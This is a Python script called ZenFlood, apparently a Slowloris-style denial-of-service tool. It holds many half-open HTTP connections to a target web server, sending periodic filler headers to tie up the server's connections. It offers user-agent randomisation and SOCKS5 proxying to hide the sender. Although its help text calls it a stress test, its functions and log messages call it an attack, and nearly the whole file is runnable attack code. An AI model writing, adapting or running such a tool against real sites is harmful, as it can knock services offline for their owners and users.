#!/usr/bin/env python3

"""
 ________                      ________  __                            __
/        |                    /        |/  |                          /  |
$$$$$$$$/   ______   _______  $$$$$$$$/ $$ |  ______    ______    ____$$ |
    /$$/   /      \ /       \ $$ |__    $$ | /      \  /      \  /    $$ |
   /$$/   /$$$$$$  |$$$$$$$  |$$    |   $$ |/$$$$$$  |/$$$$$$  |/$$$$$$$ |
  /$$/    $$    $$ |$$ |  $$ |$$$$$/    $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |
 /$$/____ $$$$$$$$/ $$ |  $$ |$$ |      $$ |$$ \__$$ |$$ \__$$ |$$ \__$$ |
/$$      |$$       |$$ |  $$ |$$ |      $$ |$$    $$/ $$    $$/ $$    $$ |
$$$$$$$$/  $$$$$$$/ $$/   $$/ $$/       $$/  $$$$$$/   $$$$$$/   $$$$$$$/

Written by ZenRat-47. https://github.com/ZenRAT-47. Special Occasions.

"""


import argparse
import logging
import random
import socket
import sys
import time
import ssl

def parse_arguments():
    parser = argparse.ArgumentParser(description="ZenFlood, low bandwidth stress test tool for websites")
    parser.add_argument("host", nargs="?", help="Host to perform stress test on")
    parser.add_argument("-p", "--port", default=80, type=int, help="Port of webserver, usually 80")
    parser.add_argument("-s", "--sockets", default=150, type=int, help="Number of sockets to use in the test")
    parser.add_argument("-v", "--verbose", action="store_true", help="Increases logging")
    parser.add_argument("-ua", "--randuseragents", action="store_true", help="Randomizes user-agents with each request")
    parser.add_argument("-x", "--useproxy", action="store_true", help="Use a SOCKS5 proxy for connecting")
    parser.add_argument("--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host")
    parser.add_argument("--proxy-port", default=8080, type=int, help="SOCKS5 proxy port")
    parser.add_argument("--https", action="store_true", help="Use HTTPS for the requests")
    parser.add_argument("--sleeptime", default=15, type=int, help="Time to sleep between each header sent")

    args = parser.parse_args()
    if not args.host:
        parser.print_help()
        sys.exit(1)

    return args

def configure_logging(verbose):
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=level)

def init_socket(ip, port, https, proxy_settings):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=ip)

    if proxy_settings['use']:
        from socks import setdefaultproxy, socksocket, PROXY_TYPE_SOCKS5  # Lazy import
        setdefaultproxy(PROXY_TYPE_SOCKS5, proxy_settings['host'], proxy_settings['port'])
        s = socksocket()
        s.connect((ip, port))
    else:
        s.connect((ip, port))

    return s

def send_line(sock, line):
    sock.send((line + "\r\n").encode("utf-8"))

def send_header(sock, name, value):
    send_line(sock, f"{name}: {value}")

def init_socket_list(host, port, https, user_agents, randuseragent, num_sockets, proxy_settings):
    list_of_sockets = []
    for _ in range(num_sockets):
        try:
            s = init_socket(host, port, https, proxy_settings)
            ua = random.choice(user_agents) if randuseragent else user_agents[0]
            send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1")
            send_header(s, "User-Agent", ua)
            send_header(s, "Accept-language", "en-US,en,q=0.5")
            list_of_sockets.append(s)
        except socket.error as e:
            logging.debug(f"Failed to create new socket: {e}")
    return list_of_sockets

def zenflood_attack(host, port, sockets, sleeptime, https, randuseragent, proxy_settings):
    user_agents = [...]  # Your list of user agents here

    logging.info("Attacking %s with %s sockets.", host, sockets)
    socket_list = init_socket_list(host, port, https, user_agents, randuseragent, sockets, proxy_settings)

    while True:
        logging.info("Sending keep-alive headers. Socket count: %s", len(socket_list))
        for s in socket_list[:]:
            try:
                send_header(s, "X-a", str(random.randint(1, 5000)))
            except socket.error:
                socket_list.remove(s)

        if len(socket_list) < sockets:
            socket_list += init_socket_list(host, port, https, user_agents, randuseragent, sockets - len(socket_list), proxy_settings)

        logging.debug("Sleeping for %d seconds", sleeptime)
        time.sleep(sleeptime)

def main():
    args = parse_arguments()
    configure_logging(args.verbose)

    proxy_settings = {'use': args.useproxy, 'host': args.proxy_host, 'port': args.proxy_port} if args.useproxy else {'use': False}

    try:
        zenflood_attack(args.host, args.port, args.sockets, args.sleeptime, args.https, args.randuseragents, proxy_settings)
    except KeyboardInterrupt:
        logging.info("Stopping ZenFlood attack.")
    except Exception as e:
        logging.error(f"Error in ZenFlood attack: {e}")

if __name__ == "__main__":
    main()
